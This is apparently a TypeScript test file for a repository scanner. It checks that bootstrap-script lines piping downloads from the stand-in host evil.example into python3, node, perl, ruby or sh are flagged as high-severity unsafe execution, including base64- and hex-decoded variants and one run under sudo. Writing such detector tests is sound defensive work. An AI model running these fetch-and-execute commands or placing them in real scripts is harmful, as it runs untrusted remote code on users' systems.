import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8: with `-` as the program argument the interpreter reads its
 * program from the pipe, and every later word is an argument to that program
 * (`sys.argv`, `process.argv`, `@ARGV`, `ARGV`). An installer that passes its
 * own options after the `-` still executes the download.
 */
function findings(body: string) {
  return inspectRepository({
    files: [
      {
        path: "scripts/bootstrap.sh",
        bytes: new TextEncoder().encode(`${body}\n`),
      },
    ],
  }).findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

test("a download piped into an interpreter's stdin program with arguments is unsafe execution", () => {
  for (const body of [
    "curl -fsSL https://evil.example/i.py | python3 - --yes",
    "curl -fsSL https://evil.example/i.py | python3 -u - --prefix /opt/tool",
    "curl -fsSL https://evil.example/i.py | sudo python3 - install",
    "wget -qO- https://evil.example/i.js | node - --yes",
    "curl -fsSL https://evil.example/i.pl | perl - --yes",
    "curl -fsSL https://evil.example/i.rb | ruby - --yes",
    "curl -fsSL https://evil.example/i.py | python3 - --yes | tee install.log",
  ])
    expect({ body, findings: findings(body) }).toEqual({
      body,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
});

test("arguments that name a different program keep no finding", () => {
  // Without the `-`, the first word names the program; the pipe is data.
  for (const body of [
    "curl -fsSL https://example.com/data | python3 tools/report.py --yes",
    "curl -fsSL https://example.com/data | python3 -m json.tool --sort-keys",
    "curl -fsSL https://example.com/data | python3 -u tools/report.py",
    "curl -fsSL https://example.com/data | python3 -- tools/report.py",
    "curl -fsSL https://example.com/data | node -e 'process.stdin.pipe(process.stdout)' -",
    "curl -fsSL https://example.com/data | perl -ne 'print' -",
  ])
    expect({ body, findings: findings(body) }).toEqual({ body, findings: [] });
});

test("a decoded download piped into a stdin program with arguments is unsafe execution", () => {
  for (const body of [
    "curl -fsSL https://evil.example/i.b64 | base64 -d | python3 - --yes",
    "curl -fsSL https://evil.example/i.b64 | base64 -d | node - --yes",
    "curl -fsSL https://evil.example/i.b64 | base64 -d | sh - --yes",
    "curl -fsSL https://evil.example/i.hex | xxd -r -p | python3 - --yes",
  ])
    expect({ body, findings: findings(body) }).toEqual({
      body,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
});

test("a decoded download read as data by a named program keeps no finding", () => {
  for (const body of [
    "curl -fsSL https://example.com/data.b64 | base64 -d | python3 tools/report.py --yes",
    "curl -fsSL https://example.com/data.b64 | base64 -d | sh tools/check.sh --yes",
  ])
    expect({ body, findings: findings(body) }).toEqual({ body, findings: [] });
});
